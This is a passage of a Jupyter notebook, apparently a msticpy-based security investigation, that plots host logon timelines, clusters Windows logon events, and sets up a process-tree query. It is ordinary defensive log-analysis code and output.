"below\":[{\"id\":\"5297\"},{\"id\":\"5302\"}],\"center\":[{\"id\":\"5300\"}],\"plot_height\":120,\"plot_width\":900,\"renderers\":[{\"id\":\"5308\"}],\"title\":{\"id\":\"5287\"},\"toolbar\":{\"id\":\"5301\"},\"toolbar_location\":null,\"x_range\":{\"id\":\"5289\"},\"x_scale\":{\"id\":\"5293\"},\"y_range\":{\"id\":\"5291\"},\"y_scale\":{\"id\":\"5295\"}},\"id\":\"5286\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{\"overlay\":{\"id\":\"5278\"}},\"id\":\"5274\",\"type\":\"BoxZoomTool\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.5},\"fill_color\":{\"value\":\"#440154\"},\"line_alpha\":{\"value\":0.5},\"line_color\":{\"value\":\"#440154\"},\"size\":{\"units\":\"screen\",\"value\":10},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"y_index\"}},\"id\":\"5318\",\"type\":\"Diamond\"},{\"attributes\":{\"bottom_units\":\"screen\",\"fill_alpha\":0.5,\"fill_color\":\"lightgrey\",\"left_units\":\"screen\",\"level\":\"overlay\",\"line_alpha\":1.0,\"line_color\":\"black\",\"line_dash\":[4,4],\"line_width\":2,\"right_units\":\"screen\",\"top_units\":\"screen\"},\"id\":\"5278\",\"type\":\"BoxAnnotation\"},{\"attributes\":{\"source\":{\"id\":\"5252\"}},\"id\":\"5321\",\"type\":\"CDSView\"},{\"attributes\":{\"days\":[\"%m-%d %H:%M\"],\"hours\":[\"%H:%M:%S\"],\"milliseconds\":[\"%H:%M:%S.%3N\"],\"minutes\":[\"%H:%M:%S\"],\"seconds\":[\"%H:%M:%S\"]},\"id\":\"5303\",\"type\":\"DatetimeTickFormatter\"},{\"attributes\":{\"overlay\":{\"id\":\"5311\"},\"x_range\":{\"id\":\"5257\"},\"y_range\":null},\"id\":\"5310\",\"type\":\"RangeTool\"},{\"attributes\":{\"callback\":null,\"formatters\":{\"Tooltip\":\"printf\"},\"tooltips\":[[\"Account\",\"@Account\"],[\"LogonType\",\"@LogonType\"],[\"TimeGenerated\",\"@TimeGenerated\"]]},\"id\":\"5253\",\"type\":\"HoverTool\"},{\"attributes\":{\"fill_color\":{\"value\":\"#440154\"},\"line_color\":{\"value\":\"#440154\"},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"y_index\"}},\"id\":\"5306\",\"type\":\"Circle\"},{\"attributes\":{\"active_drag\":\"auto\",\"active_inspect\":\"auto\",\"active_multi\":null,\"active_scroll\":\"auto\",\"active_tap\":\"auto\",\"tools\":[{\"id\":\"5253\"},{\"id\":\"5273\"},{\"id\":\"5274\"},{\"id\":\"5275\"},{\"id\":\"5276\"},{\"id\":\"5277\"}]},\"id\":\"5279\",\"type\":\"Toolbar\"},{\"attributes\":{},\"id\":\"5364\",\"type\":\"YearsTicker\"},{\"attributes\":{},\"id\":\"5261\",\"type\":\"LinearScale\"},{\"attributes\":{\"data_source\":{\"id\":\"5252\"},\"glyph\":{\"id\":\"5306\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"5307\"},\"selection_glyph\":null,\"view\":{\"id\":\"5309\"}},\"id\":\"5308\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"months\":[0,2,4,6,8,10]},\"id\":\"5361\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"num_minor_ticks\":10,\"tickers\":[{\"id\":\"5340\"},{\"id\":\"5341\"},{\"id\":\"5342\"},{\"id\":\"5343\"},{\"id\":\"5344\"},{\"id\":\"5345\"},{\"id\":\"5346\"},{\"id\":\"5347\"},{\"id\":\"5348\"},{\"id\":\"5349\"},{\"id\":\"5350\"},{\"id\":\"5351\"}]},\"id\":\"5266\",\"type\":\"DatetimeTicker\"},{\"attributes\":{\"formatter\":{\"id\":\"5303\"},\"ticker\":{\"id\":\"5298\"}},\"id\":\"5297\",\"type\":\"DatetimeAxis\"},{\"attributes\":{\"months\":[0,6]},\"id\":\"5363\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"end\":1594166794373.9001,\"start\":1594162120086.0999},\"id\":\"5289\",\"type\":\"Range1d\"},{\"attributes\":{\"source\":{\"id\":\"5322\"}},\"id\":\"5326\",\"type\":\"CDSView\"},{\"attributes\":{\"fill_alpha\":0.2,\"fill_color\":\"navy\",\"level\":\"overlay\",\"line_alpha\":1.0,\"line_color\":\"black\",\"line_dash\":[2,2],\"line_width\":0.5},\"id\":\"5311\",\"type\":\"BoxAnnotation\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"#440154\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"#440154\"},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"y_index\"}},\"id\":\"5307\",\"type\":\"Circle\"},{\"attributes\":{\"axis\":{\"id\":\"5265\"},\"minor_grid_line_alpha\":0.3,\"minor_grid_line_color\":\"navy\",\"ticker\":null},\"id\":\"5268\",\"type\":\"Grid\"},{\"attributes\":{},\"id\":\"5291\",\"type\":\"DataRange1d\"},{\"attributes\":{\"dimensions\":\"width\"},\"id\":\"5273\",\"type\":\"WheelZoomTool\"},{\"attributes\":{\"axis\":{\"id\":\"5269\"},\"dimension\":1,\"grid_line_color\":null,\"ticker\":null},\"id\":\"5272\",\"type\":\"Grid\"},{\"attributes\":{},\"id\":\"5293\",\"type\":\"LinearScale\"},{\"attributes\":{\"num_minor_ticks\":5,\"tickers\":[{\"id\":\"5353\"},{\"id\":\"5354\"},{\"id\":\"5355\"},{\"id\":\"5356\"},{\"id\":\"5357\"},{\"id\":\"5358\"},{\"id\":\"5359\"},{\"id\":\"5360\"},{\"id\":\"5361\"},{\"id\":\"5362\"},{\"id\":\"5363\"},{\"id\":\"5364\"}]},\"id\":\"5298\",\"type\":\"DatetimeTicker\"},{\"attributes\":{},\"id\":\"5295\",\"type\":\"LinearScale\"},{\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]},\"id\":\"5356\",\"type\":\"DaysTicker\"},{\"attributes\":{\"end\":1594166614593.6,\"start\":1594162299866.4},\"id\":\"5257\",\"type\":\"Range1d\"},{\"attributes\":{\"line_alpha\":0.1,\"line_color\":\"red\",\"line_dash\":[6],\"line_width\":2,\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"5324\",\"type\":\"Line\"},{\"attributes\":{},\"id\":\"5263\",\"type\":\"LinearScale\"},{\"attributes\":{\"axis\":{\"id\":\"5297\"},\"ticker\":null},\"id\":\"5300\",\"type\":\"Grid\"},{\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]},\"id\":\"5360\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"axis_label\":\"Event Time\",\"formatter\":{\"id\":\"5315\"},\"ticker\":{\"id\":\"5266\"}},\"id\":\"5265\",\"type\":\"DatetimeAxis\"},{\"attributes\":{\"days\":[1,15]},\"id\":\"5359\",\"type\":\"DaysTicker\"},{\"attributes\":{\"months\":[0,4,8]},\"id\":\"5362\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"mantissas\":[1,2,5],\"max_interval\":500.0,\"num_minor_ticks\":0},\"id\":\"5353\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{},\"id\":\"5270\",\"type\":\"BasicTicker\"},{\"attributes\":{\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"max_interval\":43200000.0,\"min_interval\":3600000.0,\"num_minor_ticks\":0},\"id\":\"5355\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"data\":{\"Account\":[\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\"],\"LogonType\":[5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5],\"TimeGenerated\":{\"__ndarray__\":\"AJAGJLgyd0IAsJwnuDJ3QgAgLyy4MndCAGDKMrgyd0IA8Fh2uDJ3QgBQmtO4MndCAEDu07gyd0IAcP3TuDJ3QgAwBvy3MndCAEAmAbgyd0IAQCYBuDJ3QgBwJgG4MndCACCZCLgyd0IA8KMIuDJ3QgDQ9Ai4MndCAAAoDbgyd0IA4KYNuDJ3QgDw6xm4MndCALCXILoyd0IAoF4GuzJ3QgCA0j+6MndCAAAsQ7oyd0IAUOJDujJ3QgCQ22m7MndCAHAJgLoyd0IAUGnLujJ3QgBQ2NC6MndCANBnsrkyd0I=\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[28]},\"index\":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27],\"y_index\":[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]},\"selected\":{\"id\":\"5337\"},\"selection_policy\":{\"id\":\"5336\"}},\"id\":\"5252\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"days\":[1,8,15,22]},\"id\":\"5358\",\"type\":\"DaysTicker\"},{\"attributes\":{\"start\":-1.0},\"id\":\"5259\",\"type\":\"Range1d\"},{\"attributes\":{\"align\":\"right\",\"text\":\"Drag the middle or edges of the selection box to change the range in the main chart\",\"text_font_size\":{\"value\":\"10px\"}},\"id\":\"5302\",\"type\":\"Title\"},{\"attributes\":{\"mantissas\":[1,2,5],\"max_interval\":500.0,\"num_minor_ticks\":0},\"id\":\"5340\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"source\":{\"id\":\"5252\"}},\"id\":\"5309\",\"type\":\"CDSView\"},{\"attributes\":{\"days\":[1,15]},\"id\":\"5346\",\"type\":\"DaysTicker\"},{\"attributes\":{\"below\":[{\"id\":\"5265\"}],\"center\":[{\"id\":\"5268\"},{\"id\":\"5272\"},{\"id\":\"5327\"}],\"left\":[{\"id\":\"5269\"}],\"min_border_left\":50,\"plot_height\":200,\"plot_width\":900,\"renderers\":[{\"id\":\"5320\"},{\"id\":\"5325\"}],\"title\":{\"id\":\"5255\"},\"toolbar\":{\"id\":\"5279\"},\"x_range\":{\"id\":\"5257\"},\"x_scale\":{\"id\":\"5261\"},\"y_range\":{\"id\":\"5259\"},\"y_scale\":{\"id\":\"5263\"}},\"id\":\"5254\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{\"background_fill_alpha\":0.5,\"background_fill_color\":\"white\",\"border_line_color\":\"red\",\"render_mode\":\"css\",\"text\":\"< Alert time\",\"text_font_size\":\"8pt\",\"x\":1594165588000.0,\"y\":0,\"y_offset\":10},\"id\":\"5327\",\"type\":\"Label\"},{\"attributes\":{},\"id\":\"5351\",\"type\":\"YearsTicker\"},{\"attributes\":{\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"max_interval\":1800000.0,\"min_interval\":1000.0,\"num_minor_ticks\":0},\"id\":\"5341\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"days\":[1,8,15,22]},\"id\":\"5345\",\"type\":\"DaysTicker\"},{\"attributes\":{},\"id\":\"5336\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]},\"id\":\"5347\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]},\"id\":\"5357\",\"type\":\"DaysTicker\"},{\"attributes\":{},\"id\":\"5337\",\"type\":\"Selection\"},{\"attributes\":{\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"max_interval\":1800000.0,\"min_interval\":1000.0,\"num_minor_ticks\":0},\"id\":\"5354\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"data_source\":{\"id\":\"5322\"},\"glyph\":{\"id\":\"5323\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"5324\"},\"selection_glyph\":null,\"view\":{\"id\":\"5326\"}},\"id\":\"5325\",\"type\":\"GlyphRenderer\"},{\"attributes\":{},\"id\":\"5339\",\"type\":\"Selection\"},{\"attributes\":{\"months\":[0,4,8]},\"id\":\"5349\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"text\":\"Timeline: Host Logons\"},\"id\":\"5255\",\"type\":\"Title\"},{\"attributes\":{\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"max_interval\":43200000.0,\"min_interval\":3600000.0,\"num_minor_ticks\":0},\"id\":\"5342\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"formatter\":{\"id\":\"5331\"},\"ticker\":{\"id\":\"5270\"},\"visible\":false},\"id\":\"5269\",\"type\":\"LinearAxis\"},{\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]},\"id\":\"5344\",\"type\":\"DaysTicker\"},{\"attributes\":{\"text\":\"Range Selector\"},\"id\":\"5287\",\"type\":\"Title\"},{\"attributes\":{},\"id\":\"5338\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]},\"id\":\"5343\",\"type\":\"DaysTicker\"},{\"attributes\":{\"days\":[\"%m-%d %H:%M\"],\"hours\":[\"%H:%M:%S\"],\"milliseconds\":[\"%H:%M:%S.%3N\"],\"minutes\":[\"%H:%M:%S\"],\"seconds\":[\"%H:%M:%S\"]},\"id\":\"5315\",\"type\":\"DatetimeTickFormatter\"},{\"attributes\":{\"months\":[0,6]},\"id\":\"5350\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"months\":[0,2,4,6,8,10]},\"id\":\"5348\",\"type\":\"MonthsTicker\"}],\"root_ids\":[\"5328\"]},\"title\":\"Bokeh Application\",\"version\":\"2.1.1\"}};\n",
       "  var render_items = [{\"docid\":\"e0b488a2-84be-4438-b47c-4660ed5a3a86\",\"root_ids\":[\"5328\"],\"roots\":{\"5328\":\"41623537-46d3-454a-8a3a-ba23eb27a0ef\"}}];\n",
       "  root.Bokeh.embed.embed_items_notebook(docs_json, render_items);\n",
       "\n",
       "  }\n",
       "  if (root.Bokeh !== undefined) {\n",
       "    embed_document(root);\n",
       "  } else {\n",
       "    var attempts = 0;\n",
       "    var timer = setInterval(function(root) {\n",
       "      if (root.Bokeh !== undefined) {\n",
       "        clearInterval(timer);\n",
       "        embed_document(root);\n",
       "      } else {\n",
       "        attempts++;\n",
       "        if (attempts > 100) {\n",
       "          clearInterval(timer);\n",
       "          console.log(\"Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing\");\n",
       "        }\n",
       "      }\n",
       "    }, 10, root)\n",
       "  }\n",
       "})(window);"
      ],
      "application/vnd.bokehjs_exec.v0+json": ""
     },
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "5328"
      }
     },
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div style=\"display: table;\"><div style=\"display: table-row;\"><div style=\"display: table-cell;\"><b title=\"bokeh.models.layouts.Column\">Column</b>(</div><div style=\"display: table-cell;\">id&nbsp;=&nbsp;'5328', <span id=\"5584\" style=\"cursor: pointer;\">&hellip;)</span></div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">align&nbsp;=&nbsp;'start',</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">aspect_ratio&nbsp;=&nbsp;None,</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">background&nbsp;=&nbsp;None,</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">children&nbsp;=&nbsp;[Figure(id='5254', ...), Figure(id='5286', ...)],</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">css_classes&nbsp;=&nbsp;[],</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">disabled&nbsp;=&nbsp;False,</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">height&nbsp;=&nbsp;None,</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">height_policy&nbsp;=&nbsp;'auto',</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">js_event_callbacks&nbsp;=&nbsp;{},</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">js_property_callbacks&nbsp;=&nbsp;{},</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">margin&nbsp;=&nbsp;(0, 0, 0, 0),</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">max_height&nbsp;=&nbsp;None,</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">max_width&nbsp;=&nbsp;None,</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">min_height&nbsp;=&nbsp;None,</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">min_width&nbsp;=&nbsp;None,</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">name&nbsp;=&nbsp;None,</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">rows&nbsp;=&nbsp;'auto',</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">sizing_mode&nbsp;=&nbsp;None,</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">spacing&nbsp;=&nbsp;0,</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">subscribed_events&nbsp;=&nbsp;[],</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">tags&nbsp;=&nbsp;[],</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">visible&nbsp;=&nbsp;True,</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">width&nbsp;=&nbsp;None,</div></div><div class=\"5583\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">width_policy&nbsp;=&nbsp;'auto')</div></div></div>\n",
       "<script>\n",
       "(function() {\n",
       "  var expanded = false;\n",
       "  var ellipsis = document.getElementById(\"5584\");\n",
       "  ellipsis.addEventListener(\"click\", function() {\n",
       "    var rows = document.getElementsByClassName(\"5583\");\n",
       "    for (var i = 0; i < rows.length; i++) {\n",
       "      var el = rows[i];\n",
       "      el.style.display = expanded ? \"none\" : \"table-row\";\n",
       "    }\n",
       "    ellipsis.innerHTML = expanded ? \"&hellip;)\" : \"&lsaquo;&lsaquo;&lsaquo;\";\n",
       "    expanded = !expanded;\n",
       "  });\n",
       "})();\n",
       "</script>\n"
      ],
      "text/plain": [
       "Column(id='5328', ...)"
      ]
     },
     "execution_count": 63,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "host_logons = qry_prov.WindowsSecurity.list_host_logons(\n",
    "    start=start,end=end, host_name=host_name)\n",
    "tooltip_cols = [\"TimeGenerated\", \"Account\", \"LogonType\", 'TimeGenerated']\n",
    "nbdisplay.display_timeline(\n",
    "        data=host_logons,\n",
    "        alert=rel_alert_select.selected_alert,\n",
    "        title=\"Host Logons\",\n",
    "        source_columns = tooltip_cols,\n",
    "        group_by = \"LogonType\",\n",
    "        height=200,\n",
    "    )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<p style=''>Number of input events: 28</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Number of clustered events: 1</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5903d9d8f7c44ea59d9be954ddfb4249",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "VBox(children=(Text(value='', description='Filter:', style=DescriptionStyle(description_width='initial')), Sel…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<hr>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "        <style>\n",
       "            .table_logon {border-collapse: collapse; width: 50%;}\n",
       "            .cell_logon {border: 1px solid #ddd !important;\n",
       "                text-align: left !important; padding: 15px !important;}\n",
       "        </style>\n",
       "        <table class='table_logon'><tr class='cell_logon'><td class='cell_logon'><b>Account: </b>SYSTEM<br><b>Account Domain: </b>NT AUTHORITY<br><b>Logon Time: </b>2020-07-07 22:57:39.427000+00:00<br><b>Logon type: </b>5(Service)<br><b>User Id/SID: </b>S-1-5-18<br>&nbsp;&nbsp;SID S-1-5-18 is LOCAL_SYSTEM<br><br><b>Subject (source) account: </b>WORKGROUP/BlackHatDemoHos$<br><b>Logon process: </b>Advapi  <br><b>Authentication: </b>Negotiate<br><b>Source IpAddress: </b>-<br><b>Source Host: </b>-<br><b>Logon status: </b><br></td></tr></table>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from msticpy.sectools.eventcluster import (\n",
    "    dbcluster_events,\n",
    "    add_process_features,\n",
    "    _string_score,\n",
    ")\n",
    "\n",
    "if host_logons is None or host_logons.empty:\n",
    "    md(\"No host logons recorded. This section cannot be run.\")\n",
    "    raise ValueError(\"aborted\")\n",
    "\n",
    "# Set up clustering features and run DBScan clustering\n",
    "logon_features = host_logons.copy()\n",
    "logon_features[\"AccountNum\"] = host_logons.apply(\n",
    "    lambda x: _string_score(x.Account), axis=1\n",
    ")\n",
    "logon_features[\"TargetUserNum\"] = host_logons.apply(\n",
    "    lambda x: _string_score(x.TargetUserName), axis=1\n",
    ")\n",
    "logon_features[\"LogonHour\"] = host_logons.apply(lambda x: x.TimeGenerated.hour, axis=1)\n",
    "\n",
    "# you might need to play around with the max_cluster_distance parameter.\n",
    "# decreasing this gives more clusters.\n",
    "(clus_logons, _, _) = dbcluster_events(\n",
    "    data=logon_features,\n",
    "    time_column=\"TimeGenerated\",\n",
    "    cluster_columns=[\"AccountNum\", \"LogonType\", \"TargetUserNum\"],\n",
    "    max_cluster_distance=0.0001,\n",
    ")\n",
    "md(f\"Number of input events: {len(host_logons)}\")\n",
    "md(f\"Number of clustered events: {len(clus_logons)}\")\n",
    "\n",
    "import re\n",
    "\n",
    "# Build a list of distinct logon patterns from the clustered data\n",
    "dist_logons = clus_logons.sort_values(\"TimeGenerated\")[\n",
    "    [\"TargetUserName\", \"TimeGenerated\", \"LastEventTime\", \"LogonType\", \"ClusterSize\"]\n",
    "]\n",
    "dist_logons = dist_logons.apply(\n",
    "    lambda x: (\n",
    "        f\"{x.TargetUserName}:    \"\n",
    "        f\"(logontype {x.LogonType})   \"\n",
    "        f\"timerange: {x.TimeGenerated} - {x.LastEventTime}    \"\n",
    "        f\"count: {x.ClusterSize}\"\n",
    "    ),\n",
    "    axis=1,\n",
    ")\n",
    "# Convert to dict, flipping keys/values\n",
    "dist_logons = {v: k for k, v in dist_logons.to_dict().items()}\n",
    "\n",
    "\n",
    "def get_selected_logon_cluster(selected_item):\n",
    "    acct = clus_logons.loc[selected_item][\"TargetUserName\"]\n",
    "    logon_type = clus_logons.loc[selected_item][\"LogonType\"]\n",
    "    return host_logons.query(\"TargetUserName == @acct and LogonType == @logon_type\")\n",
    "\n",
    "\n",
    "def show_logon(idx):\n",
    "    return nbdisplay.format_logon(pd.DataFrame(clus_logons.loc[idx]).T)\n",
    "\n",
    "\n",
    "logon_wgt = nbwidgets.SelectItem(\n",
    "    description=\"Select logon cluster to examine\",\n",
    "    item_dict=dist_logons,\n",
    "    action=show_logon,\n",
    "    height=\"200px\",\n",
    "    width=\"100%\",\n",
    "    auto_display=True,\n",
    ")\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {},
   "outputs": [],
   "source": [
    "start = clus_logons.loc[logon_wgt.value]['FirstEventTime']\n",
    "end = clus_logons.loc[logon_wgt.value]['LastEventTime']"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Process Tree"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "05d25776bdd549809fa32409e5c42096",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HTML(value='<h4>Set query time boundaries</h4>')"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4ff64b4ad20c449a880233a1c17804a7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(DatePicker(value=datetime.date(2020, 7, 7), description='Origin Date'), Text(value='22:57:39.42…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0f8915f3f6a443aba5ef720c7a6e70a7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "VBox(children=(IntRangeSlider(value=(-1, 3), description='Time Range (hour):', layout=Layout(width='80%'), max…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "timescope = nbwidgets.QueryTime(\n",
    "    units=\"hours\",\n",
    "    origin_time = start,\n",
    "    max_before=12,\n",
    "    max_after=24,\n",
    "    before=1,\n",
    "    after=3,\n",
    "    auto_display=True,\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "059c220d2a8a484baf7262ecb7fc61d7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, bar_style='info', description='Progress:'), Label(value='0%')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'Processes': 675, 'RootProcesses': 18, 'LeafProcesses': 558, 'BranchProcesses': 99, 'IsolatedProcesses': 0, 'LargestTreeDepth': 5}\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "222a52a33cfa42ac9e072666a9dc5e89",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "VBox(children=(Text(value='', description='Filter:', style=DescriptionStyle(description_width='initial')), Sel…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<hr>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
